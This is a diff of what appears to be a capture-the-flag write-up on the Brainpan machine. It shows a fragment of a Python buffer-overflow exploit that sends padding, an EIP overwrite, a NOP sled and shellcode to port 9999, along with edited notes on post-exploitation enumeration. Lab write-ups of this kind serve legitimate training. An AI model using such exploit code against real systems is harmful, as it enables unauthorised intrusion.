@@ -136,7 +136,6 @@ try:
 	print("Sending payload:...")
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.connect(('Target_IP',9999))
-	s.recv(1024)
 	s.send(padding + EIP + nop + shellcode + b'\r\n')
 	s.close()
 
@@ -151,7 +150,10 @@ The closest it had was echo %USERNAME% and hostname which work in all later vers
 
 Next check set to see environment variables, ver to see the OS version, tasklist to list running processes.
 
-On first inspection a script Checksrv.sh appears to keep brainpan.exe and SimpleHTTPServer running:
+Three things:
+- Script Checksrv.sh appears to keep brainpan.exe and SimpleHTTPServer running.
+- This appears to be running these in wine.
+- /home/... is common home directory in linux
 ```
 Z:\home\puck>type checsrv.sh
 File not found.
